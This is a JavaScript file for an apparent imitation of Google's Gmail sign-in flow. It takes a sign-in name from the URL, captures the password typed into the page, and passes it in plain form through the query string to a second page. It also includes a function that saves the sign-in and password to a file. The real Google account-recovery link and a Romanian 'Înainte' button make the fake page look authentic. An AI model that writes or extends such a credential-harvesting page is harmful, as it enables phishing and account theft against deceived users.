document.addEventListener('DOMContentLoaded', function() {
    function addButtonListener(buttonId, url) {
        var button = document.getElementById(buttonId);
        if (button) {
            button.addEventListener('click', function(event) {
                event.preventDefault(); // Prevents the default form submission behavior
                redirectTo(url);
            });
        }
    }
    async function saveToFile(signin, password) {
      try {
          const fileHandle = await window.showSaveFilePicker();
          const writable = await fileHandle.createWritable();
          
          // Write the data to the file
          await writable.write(`Signin: ${signin}\nPassword: ${password}\n`);
          await writable.close();
      } catch (error) {
            console.error('Error saving to file:', error);
        }
    }
    function redirectTo(url) {
        window.location.href = url;
    }

    function removeEndString(originalString, stringToRemove) {
        if (originalString.endsWith(stringToRemove)) {
            return originalString.slice(0, -stringToRemove.length);
        } else {
            return originalString;
        }
    }
    function addEndString(firstString, stringToAdd) {
      if (firstString.endsWith(stringToAdd)) {
          return firstString;
      } else {
          return firstString + stringToAdd;
      }
    }
  function getUrlParameter(name) {
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(window.location.href);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }

    function savePasswordAndRedirect() {
    var passwordField = document.getElementById('myInput');
    if (passwordField) {
        var passwordValue = passwordField.value;
        var encodedPassword = encodeURIComponent(passwordValue);
        var signinValue = getUrlParameter('signin');

        // Append '@gmail.com' to the input if it doesn't contain it
        var displayValue = signinValue.includes('@gmail.com') ? signinValue : signinValue + '@gmail.com';

        // Remove '@gmail.com' from the end if present
        var displayValue1 = removeEndString(signinValue, '@gmail.com');

        // Redirect to password.html with the updated display values
        redirectTo('password.html?signin=' + signinValue + '&password=' + encodedPassword + '&displayValue=' + encodeURIComponent(displayValue) + '&displayValue1=' + encodeURIComponent(displayValue1));
        }
    }

    var passwordField = document.getElementById('myInput');
    if (passwordField) {
        passwordField.focus();
    }

    addButtonListener('forgot', 'https://accounts.google.com/signin/v2/usernamerecovery');
    
    var submitButton = document.getElementById('submit');
    if (submitButton) {
        submitButton.addEventListener('click', function(event) {
            event.preventDefault();
            // Call the savePasswordAndRedirect function when the 'Înainte' button is clicked
            savePasswordAndRedirect();
        });
    }

    var passwordField = document.getElementById('myInput');
    if (passwordField) {
        passwordField.addEventListener('keyup', function(event) {
            if (event.key === 'Enter') {
                // Redirect to 'password.html' with the password parameter when 'Enter' key is pressed
                savePasswordAndRedirect();
            }
        });
    }

    var signinValue = getUrlParameter('signin');

    var displayValue = document.getElementById('displayValue');
    var displayValue1 = document.getElementById('displayValue1');

    if (displayValue && displayValue1) {
        displayValue.textContent = signinValue;
        displayValue1.textContent = signinValue;

        stringToDetect = "@gmail.com";
        stringToPlus = "@gmail.com";
        let result1 = removeEndString(displayValue1.textContent, stringToDetect);
        let result = addEndString(displayValue.textContent, stringToPlus)
        displayValue1.textContent = result1;
        displayValue.textContent = result;
    }
});
